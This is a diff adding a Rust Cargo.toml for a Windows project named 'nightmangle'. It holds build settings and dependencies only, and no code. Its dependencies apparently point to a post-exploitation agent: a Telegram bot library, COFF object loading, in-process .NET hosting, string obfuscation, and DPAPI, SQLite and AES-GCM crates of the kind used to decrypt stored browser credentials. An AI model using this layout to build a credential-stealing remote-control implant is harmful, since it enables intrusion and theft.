@@ -1,0 +1,97 @@
+[package]
+name = "nightmangle"
+version = "0.1.2"
+edition = "2021"
+
+# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
+
+[profile.release]
+# Optimize for size on release.
+panic = "abort"
+trim-path = true
+debug  = false
+codegen-units = 1
+opt-level = "z" 
+lto = true
+
+[profile.release.custom_debuginfo]
+strip = "debuginfo"
+
+[profile.release.custom_symbols]
+strip = "symbols"
+
+[dependencies]
+clap = { version = "4.3.5", features = ["derive"] }     # For command line parsing.
+tracing-subscriber = "0.3.17"                           # For logging.
+color-eyre = "0.6.2"                                    # For error handling.
+goblin = { version = "0.7.1", features = ["alloc"] }    # For parsing COFF files. object can be used too.
+widestring = "1.0.2"                                    # For wide string support.
+tracing = "0.1.37"                                      # For logging.                                    
+printf-compat = "0.1.1"                                 # For printf formatting.
+byteorder = "1.4.3"                                     # For endianess conversion.
+
+# Windows APIs.
+windows = { version = "0.48.0", features = [
+    "Win32_Foundation",
+    "Win32_System_Memory",
+    "Win32_System_SystemServices",
+    "Win32_System_LibraryLoader",
+    "Win32_System_Threading",
+    "Win32_Security",
+    "Win32_System_Diagnostics_Debug"
+] }
+
+# Pure type definitions for Windows APIs.
+windows-sys = { version = "0.45.0", features = [
+    "Win32_Foundation",
+    "Win32_System_Memory",
+    "Win32_System_SystemServices",
+    "Win32_System_LibraryLoader",
+    "Win32_System_Threading",
+    "Win32_Security",
+    "Win32_System_Diagnostics_Debug",
+    "Win32_Storage_FileSystem",
+    "Win32_System_Com_StructuredStorage",
+    "Win32_System_Diagnostics_ToolHelp",
+    "Win32_System_WindowsProgramming",
+    "Win32_Security_Authorization",
+    "Win32_System_Kernel",
+    "Win32_System_IO",
+    "Win32_System_Pipes",
+    "Win32_UI_WindowsAndMessaging",
+    "Win32_System_Environment",
+    "Win32_System_SystemInformation"
+] }
+
+teloxide = { version = "0.12", features = ["macros"] }
+tokio = { version =  "1.8", features = ["macros", "fs", "rt-multi-thread", "macros", "process", "rt"] }
+serde_json = "1.0.96"
+# serde = "1.0.163"
+reqwest = "0.11.18"
+async-trait = "0.1.68"
+chrono = "0.4.6"
+# Added from here
+image = "0.23.4"
+winsafe = "0.0.6"
+ring = "0.16"
+aes = "0.6.0"
+block-modes = "0.7.0"
+sha1 = "0.6.0"
+des = "0.6.0"
+obfstr = "0.4.0"
+der-parser = "8.1.0"
+app_dirs = { package = "app_dirs2", version = "2.3" }
+rusqlite = { version = "0.27.0", features = ["bundled"]}
+aes-gcm = "0.9.4"
+serde = { version = "1.0.163", features = ["derive"] }
+base64 = "0.13.0"
+winapi = { version = "0.3.9", features = ["winuser", "dpapi", "errhandlingapi"] }
+rand = "0.5"
+clroxide = "1.1.1"
+
+[build-dependencies]
+static_vcruntime = "2.0"
+
+[target.'cfg(windows)'.dependencies.winapi]
+version = "*"
+features = ["windef", "ntdef", "minwindef", "wingdi", "winuser", "winnt", "processthreadsapi", "psapi", "winnls"]
